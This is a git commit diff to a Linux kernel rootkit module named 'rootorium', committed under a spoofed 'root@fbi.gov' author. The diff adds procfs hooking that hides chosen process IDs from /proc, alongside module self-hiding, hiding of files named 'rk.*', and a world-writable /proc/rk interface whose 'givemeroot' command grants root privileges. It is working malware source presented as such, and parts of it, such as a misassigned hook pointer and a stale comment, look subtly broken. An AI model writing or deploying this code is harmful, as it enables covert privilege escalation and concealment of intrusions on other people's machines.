a79ac5a3e818bbf04c1bd5c3ea6d59bd8ec1b20b
ManicSec <root@fbi.gov>
2017-03-01 06:46:42 +0000

    .

--- kern_mod/rootorium.c
+++ kern_mod/rootorium.c
@@ -12,33 +12,27 @@
 
 char name[] = "";
 
-typedef int (*readdir_t)(struct file *, void *, filldir_t);
-
-filldir_t proc_filldir = NULL;
-readdir_t orig_proc_readdir = NULL;
-readdir_t *orig_readdir = NULL;
-
+static filldir_t procfs_filldir_orig;
 static filldir_t fs_filldir_orig;
 
-struct proc_dir_entry *next, *parent, *subdir;
-
+static int (*procfs_iterate_orig)(struct file *, struct dir_context *);
 static int (*fs_iterate_orig)(struct file *, struct dir_context *);
 
 static int size, temp;
 static int current_pid = 0;
 
 static char module_status[1024];
-static char hide_files = 1;
-static char module_hidden = 0;
+static char hide_files = 0;
+static char hide_procs = 0;
+static char hide_module = 0;
 static char pids_to_hide[MAX_PIDS][8];
 
-//static struct file_operations *proc_fops;
-static struct file_operations *fs_fops;
-static struct proc_dir_entry *proc_rk;
-//static struct proc_dir_entry *proc_root;
-static struct task_struct* proc_to_hide[MAX_PIDS];
 static struct list_head *module_previous;
 static struct list_head *module_kobj_previous;
+
+static struct proc_dir_entry *proc_rk;
+static struct file_operations *procfs_fops;
+static struct file_operations *fs_fops;
 
 #define MIN(a,b) \
 ( \
@@ -49,72 +43,11 @@ static struct list_head *module_kobj_previous;
     } \
 )
 
-int pid_hide(readdir_t *orig_readdir, readdir_t new_readdir)
-{
-    struct file *filep;
-
-    /*open /proc */
-    if((filep = filp_open("/proc", O_RDONLY, 0)) == NULL)
-        return -1;
-
-    /*store proc's readdir*/
-    if(orig_readdir)
-        *orig_readdir = filep->f_op->iterate;
-
-    /*set proc's readdir to new_readdir*/
-    filep->f_op->iterate = new_readdir;
-
-    filp_close(filep, 0);
-
-    return 0;
-}
-
-int pid_show(readdir_t orig_readdir)
-{
-    struct file *filep;
-
-    /*open /proc */
-    if((filep = filp_open("/proc", O_RDONLY, 0)) == NULL)
-        return -1;
-
-    /*restore /proc's readdir*/
-    filep->f_op->iterate = orig_readdir;
-    filp_close(filep, 0);
-
-    return 0;
-}
-
-void module_hide(void)
-{
-    if(module_hidden)
-        return;
-
-    module_previous = THIS_MODULE->list.prev;
-    list_del(&THIS_MODULE->list);
-    module_kobj_previous = THIS_MODULE->mkobj.kobj.entry.prev;
-    kobject_del(&THIS_MODULE->mkobj.kobj);
-    list_del(&THIS_MODULE->mkobj.kobj.entry);
-    module_hidden = !module_hidden;
-}
-
-void module_show(void)
-{
-    int result;
-
-    if(!module_hidden)
-        return;
-
-    list_add(&THIS_MODULE->list, module_previous);
-    result = kobject_add(&THIS_MODULE->mkobj.kobj,
-        THIS_MODULE->mkobj.kobj.parent, "rk");
-    module_hidden = !module_hidden;
-}
-
 static void set_addr_rw(void *addr)
 {
     unsigned int level;
 
-    pte_t *pte = lookup_address((unsigned long) addr, &level);
+    pte_t *pte = lookup_address((unsigned long)addr, &level);
 
     if(pte->pte &~ _PAGE_RW)
         pte->pte |= _PAGE_RW;
@@ -128,8 +61,49 @@ static void set_addr_ro(void *addr)
     pte->pte = pte->pte &~_PAGE_RW;
 }
 
+static int rk_atoi(const char *str)
+{
+    int ret = 0, mul = 1;
+    const char *ptr;
+
+    for(ptr = str; *ptr >= '0' && *ptr <= '9'; ptr++);
+
+    ptr--;
+    while(ptr >= str)
+    {
+        if(*ptr < '0' || *ptr > '9')
+            break;
+
+        ret += (*ptr - '0') * mul;
+        mul *= 10;
+        ptr--;
+    }
+
+    return ret;
+}
+
+static int procfs_filldir_new(void *buf, const char *name, int namelen,
+    loff_t off, ino_t ino, unsigned d_type)
+{
+    if(hide_procs)
+    {
+        if(rk_atoi(name) == rk_atoi(pids_to_hide[current_pid]))
+            return 0;
+    }
+
+    return procfs_filldir_orig(buf, name, namelen, off, ino, d_type);
+}
+
+static int procfs_iterate_new(struct file *filp, struct dir_context *ctx)
+{
+    procfs_filldir_orig = ctx->actor;
+    *((filldir_t*)&ctx->actor) = *((filldir_t*)&procfs_filldir_new);
+
+    return procfs_iterate_orig(filp, ctx);
+}
+
 static int fs_filldir_new(void *buf, const char *name, int namelen,
-    loff_t offset, u64 ino, unsigned d_type)
+    loff_t offset, ino_t ino, unsigned d_type)
 {
     if(hide_files && (!strncmp(name, "rk.", 3) || !strncmp(name, "10-rk.", 6)))
         return 0;
@@ -140,9 +114,58 @@ static int fs_filldir_new(void *buf, const char *name, int namelen,
 static int fs_iterate_new(struct file *filp, struct dir_context *ctx)
 {
     fs_filldir_orig = ctx->actor;
-    *((filldir_t*)&ctx->actor) = &fs_filldir_new;
+    *((filldir_t*)&ctx->actor) = *((filldir_t*)&fs_filldir_new);
 
     return fs_iterate_orig(filp, ctx);
+}
+
+static void procs_hide(void)
+{
+    if(hide_procs)
+        return;
+
+    set_addr_rw(procfs_fops);
+    procfs_fops->iterate = procfs_iterate_new;
+    set_addr_ro(procfs_fops);
+    hide_procs = !hide_procs;
+
+}
+
+static void procs_show(void)
+{
+    if(!hide_procs)
+        return;
+
+    set_addr_rw(procfs_fops);
+    procfs_fops->iterate = procfs_iterate_orig;
+    set_addr_ro(procfs_fops);
+    hide_procs = !hide_procs;
+}
+
+static void module_hide(void)
+{
+    if(hide_module)
+        return;
+
+    module_previous = THIS_MODULE->list.prev;
+    list_del(&THIS_MODULE->list);
+    module_kobj_previous = THIS_MODULE->mkobj.kobj.entry.prev;
+    kobject_del(&THIS_MODULE->mkobj.kobj);
+    list_del(&THIS_MODULE->mkobj.kobj.entry);
+    hide_module = !hide_module;
+}
+
+static void module_show(void)
+{
+    int result;
+
+    if(!hide_module)
+        return;
+
+    list_add(&THIS_MODULE->list, module_previous);
+    result = kobject_add(&THIS_MODULE->mkobj.kobj,
+        THIS_MODULE->mkobj.kobj.parent, "rk");
+    hide_module = !hide_module;
 }
 
 static ssize_t rk_read(struct file *file, char __user *buffer,
@@ -164,12 +187,14 @@ static ssize_t rk_read(struct file *file, char __user *buffer,
         -> nhprocXXXXX - proc id to be norm hidden \n\
         -> uhprocXXXXX - proc id to be unhidden \n\
         ->------------------------------------------------- \n\
+        -> thproc      - toggle hidden procs \n\
         -> thfile      - toggle hidden files \n\
         -> nhmodu      - a normal hidden module \n\
         -> uhmodu      - a normal unhidden module \n\
         ->------------------------------------------------- \n\
+        -> Procs hidden?:: %d \n\
         -> Files hidden?:: %d \n\
-        -> Module hidden?: %d \n", hide_files, module_hidden);
+        -> Module hidden?: %d \n", hide_procs, hide_files, hide_module);
         size = strlen(module_status);
         temp = size;
     }
@@ -188,13 +213,16 @@ static ssize_t rk_write(struct file *file, const char __user *buffer,
     {
         if(current_pid < MAX_PIDS)
         {
-            // Normal Hide Pidc
+            snprintf(pids_to_hide[current_pid], strlen(buffer + 6), "%s",
+                buffer + 6);
+            procs_hide();
             current_pid++;
         }
     }
     else if(!strncmp(buffer, "uhproc", MIN(6, count)))
     {
-        // Unhide Normal/Deep Hidden Pid
+        sprintf(pids_to_hide[current_pid], "0");
+        procs_show();
 
         if(current_pid > 0)
             current_pid--;
@@ -202,6 +230,10 @@ static ssize_t rk_write(struct file *file, const char __user *buffer,
     else if(!strncmp(buffer, "thfile", MIN(6, count)))
     {
         hide_files = !hide_files;
+    }
+    else if(!strncmp(buffer, "thproc", MIN(6, count)))
+    {
+        hide_procs = !hide_procs;
     }
     else if(!strncmp(buffer, "nhmodu", MIN(6, count)))
     {
@@ -224,6 +256,8 @@ static const struct file_operations proc_rk_fops =
 
 static int __init procfs_init(void)
 {
+    struct file *proc_filp;
+
     proc_rk = proc_create("rk", 0666, NULL, &proc_rk_fops);
     if(proc_rk == NULL)
         return 0;
@@ -232,21 +266,36 @@ static int __init procfs_init(void)
         "CMDS: \n\
     -> givemeroot  - uid and gid 0 for writing process \n\
     ->------------------------------------------------- \n\
-    -> nhprocXXXXX - proc id to be hidden \n\
+    -> nhprocXXXXX - proc id to be norm hidden \n\
     -> uhprocXXXXX - proc id to be unhidden \n\
     ->------------------------------------------------- \n\
-    -> thfile      - lets toggle hidden files \n\
-    -> nhmodu      - set the module hidden \n\
-    -> uhmodu      - set the module unhidden \n\
+    -> thproc      - toggle hidden procs \n\
+    -> thfile      - toggle hidden files \n\
+    -> nhmodu      - a normal hidden module \n\
+    -> uhmodu      - a normal unhidden module \n\
     ->------------------------------------------------- \n\
+    -> Procs hidden?:: %d \n\
     -> Files hidden?:: %d \n\
-    -> Module hidden?: %d \n", hide_files, module_hidden);
+    -> Module hidden?: %d \n", hide_procs, hide_files, hide_module);
     size = strlen(module_status);
     temp = size;
 
+    /*open /proc */
+    proc_filp = filp_open("/proc", O_RDONLY, 0);
+    if(proc_filp == NULL)
+        return 0;
+
+    procfs_fops = (struct file_operations*)proc_filp->f_op;
+    filp_close(proc_filp, NULL);
+
+    //substitute iterate of fs on which /etc is
+    fs_iterate_orig = procfs_fops->iterate;
+    set_addr_rw(procfs_fops);
+    procfs_fops->iterate = procfs_iterate_new;
+    set_addr_ro(procfs_fops);
+
     return 1;
 }
-
 
 static int __init fs_init(void)
 {
@@ -271,6 +320,13 @@ static int __init fs_init(void)
 
 static void procfs_clean(void)
 {
+    if(procfs_fops != NULL && procfs_iterate_orig != NULL)
+    {
+        set_addr_rw(procfs_fops);
+        procfs_fops->iterate = procfs_iterate_orig;
+        set_addr_ro(procfs_fops);
+    }
+
     if(proc_rk != NULL)
     {
         remove_proc_entry("rk", NULL);
